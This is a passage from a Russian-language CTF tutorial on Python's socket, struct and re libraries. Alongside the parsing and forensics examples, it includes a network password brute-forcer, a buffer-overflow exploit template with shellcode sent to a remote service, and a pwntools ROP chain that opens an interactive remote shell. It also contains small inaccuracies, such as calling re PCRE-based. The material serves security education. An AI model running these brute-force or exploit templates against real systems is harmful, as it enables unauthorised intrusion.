            result = str(eval(f"{numbers[0]} + {numbers[1]}"))
        else:
            result = "42"  # Ответ по умолчанию
        
        # 4. Отправляем ответ
        s.send((result + "\n").encode())
        
        # 5. Получаем флаг
        flag = s.recv(4096).decode()
        return flag
```

### Шаблон 2: Перебор (Brute Force) по сети
```python
def brute_force_socket(host, port, wordlist):
    """Перебор паролей/данных для сетевого сервиса"""
    for attempt in wordlist:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        
        try:
            s.connect((host, port))
            
            # Получаем приглашение
            s.recv(1024)
            
            # Отправляем попытку
            s.send((attempt + "\n").encode())
            
            # Получаем ответ
            response = s.recv(1024).decode()
            
            if "incorrect" not in response.lower() and "wrong" not in response.lower():
                print(f"[+] Успех! {attempt}")
                print(f"Ответ: {response}")
                return attempt
                
        except socket.timeout:
            print(f"[-] Таймаут для {attempt}")
        except socket.error as e:
            print(f"[-] Ошибка: {e}")
        finally:
            s.close()
    
    return None
```

## 6. Отладка и диагностика

### Включение подробного вывода
```python
def debug_socket_operations():
    """Функция для отладки сетевых операций"""
    import sys
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Логирование всех операций
    def log_operation(op, data=None):
        print(f"[DEBUG] {op}: {data if data else ''}", file=sys.stderr)
    
    # Обёртки для методов с логированием
    original_send = sock.send
    def debug_send(data):
        log_operation("send", data)
        return original_send(data)
    
    sock.send = debug_send
    
    # Подключаемся и тестируем
    sock.connect(('example.com', 80))
    sock.send(b'GET / HTTP/1.0\r\n\r\n')
    
    response = sock.recv(1024)
    log_operation("recv", response[:100])  # Первые 100 байт
```

### Проверка состояния сокета
```python
def check_socket_state(sock):
    """Проверка различных параметров сокета"""
    info = {
        "family": sock.family,
        "type": sock.type,
        "proto": sock.proto,
        "timeout": sock.gettimeout(),
        "blocking": sock.getblocking(),
    }
    
    try:
        # Только для подключенных сокетов
        info["peer_name"] = sock.getpeername()
        info["sock_name"] = sock.getsockname()
    except socket.error:
        info["peer_name"] = "not connected"
        info["sock_name"] = "not bound"
    
    # Опции сокета
    for opt_name in ['SO_REUSEADDR', 'SO_KEEPALIVE', 'TCP_NODELAY']:
        try:
            opt = getattr(socket, opt_name)
            info[opt_name] = sock.getsockopt(socket.SOL_SOCKET, opt)
        except:
            pass
    
    return info
```

## 7. Безопасность и обработка ошибок

### Защищённый клиент
```python
class SecureSocketClient:
    def __init__(self, host, port, timeout=10, max_retries=3):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.max_retries = max_retries
        
    def send_command(self, command, expect_response=True):
        """Безопасная отправка команды с повторными попытками"""
        for attempt in range(self.max_retries):
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                
                # Подключение
                sock.connect((self.host, self.port))
                
                # Отправка
                if not command.endswith('\n'):
                    command += '\n'
                sock.sendall(command.encode())
                
                if expect_response:
                    # Сбор ответа по частям
                    response = bytearray()
                    while True:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        response.extend(chunk)
                        
                        # Проверяем маркер конца
                        if b"\n" in chunk:
                            break
                    
                    return response.decode()
                else:
                    return None
                    
            except socket.timeout:
                print(f"[!] Таймаут, попытка {attempt + 1}/{self.max_retries}")
                if attempt == self.max_retries - 1:
                    raise
                    
            except socket.error as e:
                print(f"[!] Сетевая ошибка: {e}")
                if attempt == self.max_retries - 1:
                    raise
                    
            finally:
                if sock:
                    sock.close()
        
        raise ConnectionError(f"Не удалось выполнить команду после {self.max_retries} попыток")
```

## 8. Интеграция с другими библиотеками для CTF

### Комбинированный пример
```python
import socket
import struct
import re
from cryptography.fernet import Fernet  # Для криптозадач

def solve_network_ctf(host, port):
    """Решение комплексной сетевой задачи"""
    
    # 1. Подключение
    sock = socket.create_connection((host, port), timeout=10)
    
    # 2. Получение зашифрованных данных
    data = sock.recv(1024)
    
    # 3. Анализ структуры (первые 4 байта - длина)
    if len(data) >= 4:
        length = struct.unpack('>I', data[:4])[0]
        encrypted = data[4:4+length]
        
        # 4. Поиск ключа в оставшихся данных
        key_candidate = data[4+length:]
        
        # 5. Использование регулярки для поиска ключа
        key_match = re.search(rb'key:([A-Za-z0-9+/=]+)', key_candidate)
        
        if key_match:
            key = key_match.group(1)
            
            # 6. Дешифровка
            cipher = Fernet(key)
            decrypted = cipher.decrypt(encrypted)
            
            # 7. Отправка ответа
            sock.sendall(decrypted)
            
            # 8. Получение флага
            flag = sock.recv(1024)
            return flag.decode()
    
    sock.close()
    return None
```

## Ключевые моменты для запоминания:

1. **Всегда закрывайте сокеты** — используйте `with` или `try/finally`
2. **Обрабатывайте таймауты** — сетевые задачи часто зависают
3. **Проверяйте возвращаемые значения** — `send()` может отправить не все данные
4. **Используйте `sendall()`** для гарантированной отправки
5. **Кодируйте/декодируйте правильно** — сеть работает с байтами
6. **Учитывайте символы перевода строки** — многие сервисы ждут `\n`
7. **Логируйте операции** для отладки сложных протоколов

Эта библиотека — основа для 30% всех олимпиадных задач по ИБ. Освойте её до автоматизма, и вы сможете решать большинство сетевых заданий.

# Исчерпывающее руководство по библиотеке `struct` в Python

Библиотека `struct` — это ключевой инструмент для работы с бинарными данными в Python. В контексте ИБ и CTF она **абсолютно необходима** для:
- Анализа сетевых протоколов и файловых форматов
- Создания эксплойтов для бинарных уязвимостей
- Обработки сырых данных из дампов памяти (pcap, core dumps)
- Взаимодействия с низкоуровневыми сервисами

## 1. Фундаментальные концепции

### Что такое "структурированные бинарные данные"?
Это данные, имеющие жёсткую компоновку в памяти, где каждый элемент занимает определённое количество байт и имеет конкретный тип.

**Пример из CTF:**  
Сетевой пакет может иметь структуру:
```
[4 байта: заголовок][2 байта: тип][2 байта: длина][N байт: данные]
```
Чтобы прочитать такой пакет, нужно знать точный формат.

### Порядок байтов (Endianness) — КРИТИЧЕСКИ ВАЖНО!

| Обозначение | Название | Использование | Пример числа 0x12345678 |
|------------|----------|---------------|-------------------------|
| `@` или `=` | Нативный порядок | Локальные файлы | Зависит от системы |
| `<` | Little-endian | x86/x64, Windows | `78 56 34 12` |
| `>` или `!` | Big-endian | Сетевой порядок, ARM | `12 34 56 78` |

**Правило для CTF:** 
- Для сетевых задач почти всегда используйте `>` (big-endian)
- Для локальных эксплойтов под x86/x64 используйте `<` (little-endian)

## 2. Детальный разбор форматов

### Синтаксис format string
```
[порядок_байтов][типы_данных]
```

### Типы данных и их размеры

| Формат | Тип C | Размер | Диапазон значений | Описание |
|--------|-------|--------|-------------------|----------|
| `c` | `char` | 1 байт | -128..127 | Символ (байт) |
| `b` | `signed char` | 1 байт | -128..127 | Знаковый байт |
| `B` | `unsigned char` | 1 байт | 0..255 | Беззнаковый байт |
| `?` | `_Bool` | 1 байт | 0/1 | Логическое значение |
| `h` | `short` | 2 байта | -32768..32767 | Короткое целое |
| `H` | `unsigned short` | 2 байта | 0..65535 | Беззнаковое короткое |
| `i` | `int` | 4 байта | ~±2.1 млрд | Целое (обычно) |
| `I` | `unsigned int` | 4 байта | 0..~4.2 млрд | Беззнаковое целое |
| `l` | `long` | 4 или 8 байт | Зависит от ОС | Длинное целое |
| `L` | `unsigned long` | 4 или 8 байт | Зависит от ОС | Беззнаковое длинное |
| `q` | `long long` | 8 байт | ~±9.2×10¹⁸ | Очень длинное |
| `Q` | `unsigned long long` | 8 байт | 0..~1.8×10¹⁹ | Беззнаковое очень длинное |
| `f` | `float` | 4 байта | ~1.2×10⁻³⁸..3.4×10³⁸ | Число с плавающей точкой |
| `d` | `double` | 8 байта | ~2.2×10⁻³⁰⁸..1.8×10³⁰⁸ | Двойная точность |
| `s` | `char[]` | N байт | Строка байтов | Строка фиксированной длины |
| `p` | `char[]` | N байт | Pascal-строка | С префиксом длины |
| `P` | `void*` | 4 или 8 байт | Адрес | Указатель |

**Важно:** `i` и `I` обычно 4 байта, но на некоторых архитектурах могут быть 2. Для гарантии используйте явные спецификаторы:
- `int32_t` → `i` (4 байта)
- `int64_t` → `q` (8 байт)

## 3. Основные функции библиотеки

### `struct.pack(format, v1, v2, ...)`
Упаковывает Python-значения в байтовую строку.

```python
import struct

# Пример 1: Упаковка простых значений
packed = struct.pack('<Iff', 123456, 3.14159, 2.71828)
print(f"Упаковано: {packed.hex()}")  # 40e20100 6e86d83f 0e7dd43f

# Пример 2: Упаковка строки фиксированной длины
# '10s' означает строку длиной 10 байт (дополняется нулями)
name = b"admin"
packed_name = struct.pack('<10s', name)
print(f"Имя упаковано: {packed_name.hex()}")  # 61646d696e0000000000

# Пример 3: Упаковка с проверкой размера
def safe_pack(format_string, *values):
    """Безопасная упаковка с проверкой количества аргументов"""
    expected_count = len(format_string.replace('@', '').replace('<', '')
                                      .replace('>', '').replace('!', '')
                                      .replace('=', ''))
    if expected_count != len(values):
        raise ValueError(f"Ожидается {expected_count} значений, "
                       f"получено {len(values)}")
    return struct.pack(format_string, *values)

# Использование
try:
    data = safe_pack('<Ih', 100, 200)  # OK
    data = safe_pack('<Ih', 100)       # Вызовет ошибку
except ValueError as e:
    print(f"Ошибка: {e}")
```

### `struct.unpack(format, buffer)`
Распаковывает байтовую строку в кортеж Python-значений.

```python
import struct

# Пример 1: Базовая распаковка
data = b'\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00'
values = struct.unpack('<III', data)  # Little-endian, три unsigned int
print(f"Распаковано: {values}")  # (1, 2, 3)

# Пример 2: Распаковка с частичным чтением
def unpack_with_offset(format_string, buffer, offset=0):
    """Распаковка данных с указанного смещения"""
    # Вычисляем размер структуры
    size = struct.calcsize(format_string)
    
    # Проверяем, достаточно ли данных
    if offset + size > len(buffer):
        raise ValueError(f"Недостаточно данных: нужно {size} байт, "
                       f"доступно {len(buffer)-offset}")
    
    # Извлекаем нужный фрагмент и распаковываем
    chunk = buffer[offset:offset+size]
    return struct.unpack(format_string, chunk)

# Использование
buffer = b'PREFIX\x01\x00\x00\x00\x02\x00DATA'
values = unpack_with_offset('<II', buffer, 6)  # Начинаем с 6-го байта
print(f"Значения: {values}")  # (1, 2)

# Пример 3: Распаковка с автоматическим определением типа
def smart_unpack(buffer):
    """Пытается определить формат данных автоматически"""
    results = []
    
    # Пробуем разные форматы
    formats = [
        ('<I', '32-bit LE'),
        ('>I', '32-bit BE'),
        ('<Q', '64-bit LE'),
        ('>Q', '64-bit BE'),
    ]
    
    for fmt, desc in formats:
        try:
            if len(buffer) >= struct.calcsize(fmt):
                value = struct.unpack(fmt, buffer[:struct.calcsize(fmt)])[0]
                results.append((desc, value))
        except:
            pass
    
    return results

# Тестирование
test_data = b'\x01\x02\x03\x04'
for desc, value in smart_unpack(test_data):
    print(f"{desc}: {value} (0x{value:08x})")
```

### `struct.calcsize(format)`
Вычисляет размер структуры в байтах.

```python
import struct

# Пример 1: Базовое вычисление
size1 = struct.calcsize('<I')      # 4 байта
size2 = struct.calcsize('<Ih')     # 4 + 2 = 6 байт
size3 = struct.calcsize('<Ihd')    # 4 + 2 + 8 = 14 байт (с выравниванием!)

print(f"Размеры: {size1}, {size2}, {size3}")

# Пример 2: Проверка выравнивания (alignment)
def check_alignment(format_string):
    """Показывает эффект выравнивания в структурах"""
    print(f"\nФормат: {format_string}")
    
    # Размер без учёта выравнивания (наивный подсчёт)
    naive_size = 0
    for char in format_string.replace('@', '').replace('<', '')
                            .replace('>', '').replace('!', '').replace('=', ''):
        if char in 'cbB?':
            naive_size += 1
        elif char in 'hH':
            naive_size += 2
        elif char in 'iIlLf':
            naive_size += 4
        elif char in 'qQd':
            naive_size += 8
        elif char in 's':
            # Для 'Ns' нужно извлечь N
            pass
    
    # Реальный размер
    real_size = struct.calcsize(format_string)
    
    print(f"  Наивный размер: {naive_size} байт")
    print(f"  Реальный размер: {real_size} байт")
    if real_size != naive_size:
        print(f"  Выравнивание добавило: {real_size - naive_size} байт")

# Проверка
check_alignment('<bhi')    # 1 + 2 + 4 = 7, но реально 8 из-за выравнивания
check_alignment('@bhi')    # Нативная упаковка
```

### `struct.iter_unpack(format, buffer)`
Распаковывает несколько структур подряд из буфера.

```python
import struct

# Пример: Чтение массива структур
def read_struct_array(buffer, format_string):
    """Чтение массива однотипных структур"""
    items = []
    size = struct.calcsize(format_string)
    
    # Проверяем, что длина буфера кратна размеру структуры
    if len(buffer) % size != 0:
        print(f"Внимание: буфер ({len(buffer)} байт) не кратен "
              f"размеру структуры ({size} байт)")
    
    # Используем iter_unpack для эффективного чтения
    for item in struct.iter_unpack(format_string, buffer):
        items.append(item)
    
    return items

# Использование
buffer = b''.join([struct.pack('<If', i, i*1.5) for i in range(5)])
print(f"Буфер: {buffer.hex()[:50]}...")

items = read_struct_array(buffer, '<If')
for i, (int_val, float_val) in enumerate(items):
    print(f"Элемент {i}: int={int_val}, float={float_val:.2f}")
```

## 4. Практические примеры для CTF

### Пример 1: Парсинг сетевого пакета
```python
import struct

def parse_network_packet(packet_data):
    """Парсинг кастомного сетевого протокола для CTF"""
    
    # Предполагаемый формат:
    # [4 байта: магическое число][2 байта: версия][2 байта: тип]
    # [4 байта: длина][N байт: данные][4 байта: CRC]
    
    # Проверяем минимальный размер
    if len(packet_data) < 16:
        raise ValueError("Пакет слишком мал")
    
    offset = 0
    
    # 1. Магическое число
    magic, = struct.unpack_from('>I', packet_data, offset)
    offset += 4
    
    if magic != 0xDEADBEEF:
        raise ValueError(f"Неверное магическое число: 0x{magic:08x}")
    
    # 2. Версия и тип
    version, ptype = struct.unpack_from('>HH', packet_data, offset)
    offset += 4
    
    # 3. Длина данных
    data_len, = struct.unpack_from('>I', packet_data, offset)
    offset += 4
    
    # 4. Данные
    if offset + data_len > len(packet_data) - 4:  # -4 для CRC
        raise ValueError(f"Недостаточно данных: ожидается {data_len} байт")
    
    data = packet_data[offset:offset+data_len]
    offset += data_len
    
    # 5. CRC
    crc, = struct.unpack_from('>I', packet_data, offset)
    
    return {
        'magic': f'0x{magic:08x}',
        'version': version,
        'type': ptype,
        'data_length': data_len,
        'data': data,
        'crc': f'0x{crc:08x}'
    }

# Тестирование
packet = struct.pack('>IHHII', 
                     0xDEADBEEF,  # Magic
                     1,           # Version
                     0x100,       # Type
                     4,           # Data length
                     0xCAFEBABE)  # CRC
packet += b'DATA'  # Добавляем данные

result = parse_network_packet(packet + b'EXTRA')
print("Распарсенный пакет:")
for key, value in result.items():
    print(f"  {key}: {value}")
```

### Пример 2: Создание эксплойта для переполнения буфера
```python
import struct
import socket

def create_buffer_overflow_exploit():
    """Создание payload для эксплуатации переполнения буфера"""
    
    # Типичная структура эксплойта для x64:
    # [мусор до переполнения][адрес возврата][шеллкод]
    
    # 1. Определяем архитектуру
    arch = 'x64'  # или 'x86'
    
    if arch == 'x64':
        # Для x64 (little-endian)
        ptr_size = 8
        ptr_format = '<Q'
        
        # Адрес функции system() или полезной нагрузки
        # В реальном CTF этот адрес нужно найти через реверс-инжиниринг
        target_address = 0x401216
        
        # Простой шеллкод для x64 (exit(0))
        shellcode = b'\x48\x31\xff\xb0\x3c\x0f\x05'  # mov edi, 0; mov al, 60; syscall
        
    else:  # x86
        ptr_size = 4
        ptr_format = '<I'
        target_address = 0x08049182
        shellcode = b'\x31\xc0\xb0\x01\x31\xdb\xcd\x80'  # xor eax, eax; mov al, 1; xor ebx, ebx; int 0x80
    
    # 2. Определяем смещение до адреса возврата
    # В реальном CTF это определяется через анализ бинарника
    offset_to_ret = 40
    
    # 3. Создаём payload
    payload = b''
    
    # Заполняем мусором до адреса возврата
    payload += b'A' * offset_to_ret
    
    # Адрес возврата (перезаписываем сохраненный RIP/EIP)
    payload += struct.pack(ptr_format, target_address)
    
    # NOOP-слайд (опционально, для увеличения вероятности успеха)
    payload += b'\x90' * 16  # NOP инструкции
    
    # Шеллкод
    payload += shellcode
    
    # Дополнительные данные, если нужно
    payload += b'C' * 100
    
    return payload

def send_exploit(host, port):
    """Отправка эксплойта на целевой сервер"""
    payload = create_buffer_overflow_exploit()
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    
    try:
        sock.connect((host, port))
        
        # Получаем баннер (если есть)
        banner = sock.recv(1024)
        print(f"Баннер: {banner.decode()}")
        
        # Отправляем эксплойт
        sock.send(payload)
        
        # Пытаемся получить ответ
        response = sock.recv(4096)
        print(f"Ответ: {response}")
        
        # Если эксплойт успешен, может открыться шелл
        # Для простоты просто отправляем команду
        sock.send(b'cat flag.txt\n')
        flag = sock.recv(1024)
        print(f"Флаг: {flag.decode()}")
        
    except Exception as e:
        print(f"Ошибка: {e}")
    finally:
        sock.close()

# Пример использования
# send_exploit('ctf.example.com', 9999)
```

### Пример 3: Анализ дампа памяти (forensics)
```python
import struct

def analyze_memory_dump(dump_data):
    """Анализ дампа памяти на наличие структур данных"""
    
    # Ищем потенциальные структуры в дампе
    results = []
    
    # Сканируем дамп с шагом в 1 байт
    for i in range(len(dump_data) - 15):  # -15 для минимальной структуры
        # Пробуем интерпретировать как IPv4 заголовок
        if i + 20 <= len(dump_data):
            # Первое слово: версия (4 бита) + длина заголовка (4 бита)
            first_word = dump_data[i]
            version = first_word >> 4
            ihl = first_word & 0x0F
            
            # Проверяем, похоже ли на IP заголовок
            if version == 4 and ihl >= 5:
                # Извлекаем поля IP заголовка
                try:
                    total_length, = struct.unpack_from('>H', dump_data, i+2)
                    ttl, protocol = struct.unpack_from('>BB', dump_data, i+8)
                    src_ip, = struct.unpack_from('>I', dump_data, i+12)
                    dst_ip, = struct.unpack_from('>I', dump_data, i+16)
                    
                    results.append({
                        'offset': i,
                        'type': 'IPv4 Header',
                        'version': version,
                        'ihl': ihl * 4,  # в байтах
                        'total_length': total_length,
                        'ttl': ttl,
                        'protocol': protocol,
                        'src_ip': f'{(src_ip>>24)&0xFF}.{(src_ip>>16)&0xFF}.'
                                 f'{(src_ip>>8)&0xFF}.{src_ip&0xFF}',
                        'dst_ip': f'{(dst_ip>>24)&0xFF}.{(dst_ip>>16)&0xFF}.'
                                 f'{(dst_ip>>8)&0xFF}.{dst_ip&0xFF}',
                    })
                except:
                    pass
    
    return results

def find_strings_in_dump(dump_data, min_length=4):
    """Поиск ASCII строк в дампе памяти"""
    strings = []
    current_string = ''
    
    for byte in dump_data:
        # Печатные ASCII символы
        if 32 <= byte <= 126:
            current_string += chr(byte)
        else:
            if len(current_string) >= min_length:
                strings.append(current_string)
            current_string = ''
    
    if len(current_string) >= min_length:
        strings.append(current_string)
    
    return strings

# Пример использования с тестовыми данными
test_dump = bytes([
    0x45, 0x00, 0x00, 0x28,  # IP заголовок
    0x00, 0x00, 0x40, 0x00,
    0x40, 0x06, 0x00, 0x00,
    0xC0, 0xA8, 0x01, 0x01,  # 192.168.1.1
    0xC0, 0xA8, 0x01, 0x02,  # 192.168.1.2
    0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x00,  # "Hello\0"
    0x43, 0x54, 0x46, 0x7B,  # "CTF{"
    0x66, 0x6C, 0x61, 0x67,  # "flag"
    0x7D, 0x00               # "}\0"
])

print("Анализ дампа памяти:")
print("=" * 50)

# Ищем структуры
structures = analyze_memory_dump(test_dump)
for struct_info in structures:
    print(f"\nНайдена структура по смещению 0x{struct_info['offset']:x}:")
    for key, value in struct_info.items():
        if key != 'offset':
            print(f"  {key}: {value}")

# Ищем строки
strings = find_strings_in_dump(test_dump)
print(f"\nНайдено строк: {len(strings)}")
for s in strings:
    print(f"  '{s}'")
```

### Пример 4: Работа с файловыми форматами (PNG анализ)
```python
import struct

def analyze_png_file(file_path):
    """Анализ структуры PNG файла для CTF (часто используется в стеганографии)"""
    
    with open(file_path, 'rb') as f:
        data = f.read()
    
    # PNG сигнатура
    png_signature = b'\x89PNG\r\n\x1a\n'
    
    if data[:8] != png_signature:
        raise ValueError("Не PNG файл")
    
    chunks = []
    offset = 8  # Пропускаем сигнатуру
    
    while offset < len(data):
        # Читаем длину chunk'а
        if offset + 4 > len(data):
            break
        
        chunk_length, = struct.unpack_from('>I', data, offset)
        offset += 4
        
        # Читаем тип chunk'а
        if offset + 4 > len(data):
            break
        
        chunk_type = data[offset:offset+4].decode('ascii', errors='ignore')
        offset += 4
        
        # Читаем данные chunk'а
        if offset + chunk_length > len(data):
            break
        
        chunk_data = data[offset:offset+chunk_length]
        offset += chunk_length
        
        # Читаем CRC
        if offset + 4 > len(data):
            break
        
        crc, = struct.unpack_from('>I', data, offset)
        offset += 4
        
        # Проверяем критичность chunk'а
        # В PNG первый байт типа: верхний регистр = критичный, нижний = вспомогательный
        is_critical = chunk_type[0].isupper()
        
        chunks.append({
            'type': chunk_type,
            'length': chunk_length,
            'is_critical': is_critical,
            'data_preview': chunk_data[:16].hex() + ('...' if chunk_length > 16 else ''),
            'crc': f'0x{crc:08x}'
        })
    
    return chunks

def find_hidden_data_in_png(file_path):
    """Поиск скрытых данных в PNG файле"""
    
    with open(file_path, 'rb') as f:
        data = f.read()
    
    suspicious_chunks = []
    
    # Ищем нестандартные chunk'и
    standard_chunks = {'IHDR', 'PLTE', 'IDAT', 'IEND', 'tRNS', 'cHRM', 'gAMA', 
                       'iCCP', 'sBIT', 'sRGB', 'tEXt', 'zTXt', 'iTXt', 'bKGD', 
                       'hIST', 'pHYs', 'sPLT', 'tIME'}
    
    offset = 8
    while offset < len(data):
        if offset + 8 > len(data):
            break
        
        chunk_length, = struct.unpack_from('>I', data, offset)
        chunk_type = data[offset+4:offset+8].decode('ascii', errors='ignore')
        
        if chunk_type not in standard_chunks:
            # Нашли нестандартный chunk - потенциально скрытые данные
            chunk_start = offset + 8
            chunk_end = chunk_start + chunk_length
            
            if chunk_end <= len(data):
                chunk_data = data[chunk_start:chunk_end]
                
                # Проверяем, не является ли это текстом
                try:
                    text = chunk_data.decode('utf-8')
                    is_text = True
                    preview = repr(text[:50])
                except:
                    is_text = False
                    preview = chunk_data[:20].hex()
                
                suspicious_chunks.append({
                    'offset': offset,
                    'type': chunk_type,
                    'length': chunk_length,
                    'is_text': is_text,
                    'preview': preview,
                    'data': chunk_data if chunk_length < 1000 else None
                })
        
        offset += 12 + chunk_length  # 4(длина) + 4(тип) + длина + 4(CRC)
    
    return suspicious_chunks

# Пример использования
# chunks = analyze_png_file('ctf_image.png')
# hidden = find_hidden_data_in_png('ctf_image.png')
```

## 5. Продвинутые техники и утилиты

### Класс для удобной работы со структурами
```python
import struct

class BinaryStruct:
    """Удобная обёртка для работы со структурами"""
    
    def __init__(self, format_string, names=None):
        self.format = format_string
        self.size = struct.calcsize(format_string)
        
        # Извлекаем имена полей из format string
        if names is None:
            # Автогенерация имён: field0, field1, ...
            field_count = len(format_string.replace('@', '').replace('<', '')
                                         .replace('>', '').replace('!', '')
                                         .replace('=', '').replace('x', ''))
            self.names = [f'field{i}' for i in range(field_count)]
        else:
            self.names = names
        
        if len(self.names) != self.size // struct.calcsize('c'):
            raise ValueError("Количество имён не соответствует формату")
    
    def unpack(self, buffer, offset=0):
        """Распаковка структуры в словарь"""
        values = struct.unpack_from(self.format, buffer, offset)
        return dict(zip(self.names, values))
    
    def pack(self, **kwargs):
        """Упаковка структуры из ключевых аргументов"""
        values = [kwargs[name] for name in self.names]
        return struct.pack(self.format, *values)
    
    def iter_unpack(self, buffer):
        """Итеративная распаковка массива структур"""
        for values in struct.iter_unpack(self.format, buffer):
            yield dict(zip(self.names, values))
    
    def __str__(self):
        return f"BinaryStruct(format='{self.format}', size={self.size})"

# Пример использования
# Определяем структуру сетевого пакета
packet_struct = BinaryStruct(
    format_string='>IHHII',
    names=['magic', 'version', 'type', 'length', 'crc']
)

# Создаём пакет
packet = packet_struct.pack(
    magic=0xDEADBEEF,
    version=1,
    type=0x100,
    length=4,
    crc=0xCAFEBABE
)

print(f"Создан пакет: {packet.hex()}")

# Распаковываем пакет
parsed = packet_struct.unpack(packet)
print("\nРаспакованный пакет:")
for key, value in parsed.items():
    print(f"  {key}: {value} (0x{value:x})")
```

### Утилиты для отладки
```python
import struct

def hexdump(data, address=0, width=16):
    """Красивый вывод hexdump (как в hexedit)"""
    result = []
    
    for i in range(0, len(data), width):
        # Адрес
        line = f"{address + i:08x}: "
        
        # Hex данные
        hex_part = []
        ascii_part = []
        
        for j in range(width):
            if i + j < len(data):
                byte = data[i + j]
                hex_part.append(f"{byte:02x}")
                
                # ASCII представление
                if 32 <= byte <= 126:
                    ascii_part.append(chr(byte))
                else:
                    ascii_part.append('.')
            else:
                hex_part.append('  ')
                ascii_part.append(' ')
        
        # Форматируем строку
        hex_str = ' '.join(hex_part[:8]) + '  ' + ' '.join(hex_part[8:])
        ascii_str = ''.join(ascii_part)
        
        result.append(f"{line}{hex_str}  |{ascii_str}|")
    
    return '\n'.join(result)

def analyze_buffer(buffer, possible_formats=None):
    """Пытается угадать формат данных в буфере"""
    
    if possible_formats is None:
        possible_formats = [
            ('<I', '32-bit LE int'),
            ('>I', '32-bit BE int'),
            ('<Q', '64-bit LE int'),
            ('>Q', '64-bit BE int'),
            ('<d', '64-bit LE float'),
            ('>d', '64-bit BE float'),
            ('<4s', '4-byte string LE'),
            ('>4s', '4-byte string BE'),
        ]
    
    results = []
    
    for fmt, desc in possible_formats:
        try:
            size = struct.calcsize(fmt)
            if len(buffer) >= size:
                values = struct.unpack(fmt, buffer[:size])
                results.append((fmt, desc, values, size))
        except:
            pass
    
    return results

# Пример использования
test_data = struct.pack('<Ihfd', 0x12345678, -123, 3.14159, 2.718281828459045)

print("Hexdump тестовых данных:")
print(hexdump(test_data))
print("\nАнализ форматов:")
for fmt, desc, values, size in analyze_buffer(test_data):
    print(f"  {desc} ({fmt}): {values} (size: {size})")
```

## 6. Частые ошибки и лучшие практики

### Типичные ошибки:
1. **Неправильный порядок байтов**: Всегда явно указывайте `<`, `>`, или `!`.
2. **Игнорирование выравнивания**: Используйте `struct.calcsize()` для точного размера.
3. **Предположения о размерах типов**: `int` не всегда 4 байта! Используйте фиксированные типы.
4. **Не проверка границ**: Всегда проверяйте `len(buffer)` перед распаковкой.

### Лучшие практики для CTF:
1. **Создавайте утилитные функции** для часто используемых операций.
2. **Используйте `unpack_from()`** для чтения с произвольного смещения.
3. **Проверяйте магические числа** для идентификации форматов.
4. **Сохраняйте сырые данные** на диске для отладки.

### Шпаргалка по форматам:
```python
# Сетевые протоколы (big-endian):
ip_header = struct.unpack('>BBHHHBBH4s4s', data)  # IPv4 заголовок
tcp_header = struct.unpack('>HHLLBBHHH', data)    # TCP заголовок

# Файловые форматы (зависит от формата):
png_chunk = struct.unpack('>I4s', data)           # PNG chunk заголовок
bmp_header = struct.unpack('<HLHHL', data)        # BMP header (часто LE)

# Адреса и указатели:
x64_ptr = struct.unpack('<Q', data)               # 64-битный указатель (LE)
x86_ptr = struct.unpack('<I', data)               # 32-битный указатель (LE)
```

## 7. Интеграция с другими библиотеками

### С `socket` для сетевых задач:
```python
import socket
import struct

def receive_exact(sock, n):
    """Получение точного количества байт из сокета"""
    data = bytearray()
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise ConnectionError("Соединение закрыто")
        data.extend(chunk)
    return bytes(data)

def send_struct(sock, format_string, *values):
    """Отправка структурированных данных через сокет"""
    data = struct.pack(format_string, *values)
    sock.sendall(data)

def receive_struct(sock, format_string):
    """Приём и распаковка структурированных данных"""
    size = struct.calcsize(format_string)
    data = receive_exact(sock, size)
    return struct.unpack(format_string, data)

# Пример: Клиент для бинарного протокола
def binary_protocol_client(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    # Отправляем запрос
    send_struct(sock, '>HHI', 0x0001, 0x1234, 42)  # type, subtype, data
    
    # Получаем ответ
    response_type, response_data = receive_struct(sock, '>HI')
    
    print(f"Тип ответа: 0x{response_type:04x}")
    print(f"Данные: {response_data}")
    
    sock.close()
```

### С `pwn` для эксплойтов:
```python
from pwn import *
import struct

# Альтернатива struct.pack/unpack в pwntools
# p32, p64, u32, u64 - удобные обёртки

# Эквиваленты:
# struct.pack('<I', 0x12345678) == p32(0x12345678)
# struct.pack('<Q', 0x12345678) == p64(0x12345678)
# struct.unpack('<I', data)[0] == u32(data)
# struct.unpack('<Q', data)[0] == u64(data)

def pwn_exploit_with_struct():
    context(arch='amd64', os='linux')
    
    # Используем struct для сложных структур
    rop_chain = struct.pack('<QQQ', 
       0x401016,  # pop rdi; ret
       0xdeadbeef,
       0x401123   # system
    )
    
    # А pwntools для всего остального
    payload = cyclic(40) + rop_chain
    
    # Отправка
    io = remote('ctf.example.com', 4444)
    io.send(payload)
    io.interactive()
```

## Заключение

Библиотека `struct` — это **мост между высокоуровневым Python и низкоуровневыми бинарными данными**. В CTF и олимпиадных задачах она используется в:

1. **Сетевых задачах** — парсинг протоколов
2. **Реверс-инжиниринге** — анализ бинарных форматов
3. **Эксплойтации** — создание payload'ов
4. **Форензике** — анализ дампов памяти и файлов

**Ключевые правила:**
- Всегда явно указывайте порядок байтов
- Используйте `calcsize()` для проверки размеров
- Проверяйте границы буферов перед распаковкой
- Создавайте вспомогательные функции для сложных структур

Потренируйтесь на реальных CTF-задачах с бинарными данными, и работа с `struct` станет интуитивно понятной. Для отладки используйте `hexdump()` и аналогичные утилиты для визуализации данных.

# Исчерпывающее руководство по библиотеке `re` (регулярные выражения) в Python

Библиотека `re` — это реализация регулярных выражений в Python, основанная на PCRE (Perl Compatible Regular Expressions). В контексте ИБ и CTF это **ключевой инструмент** для:
- Парсинга HTML/ответов сервера
- Поиска флагов в данных
- Извлечения токенов, ключей, хешей
- Анализа логов и дампов
- Валидации и фильтрации входных данных

## 1. Фундаментальные концепции регулярных выражений

### Что такое регулярное выражение?
Регулярное выражение (regex) — это **паттерн для поиска и манипуляции текстом**. Это формальный язык для описания шаблонов строк.

### Базовый синтаксис

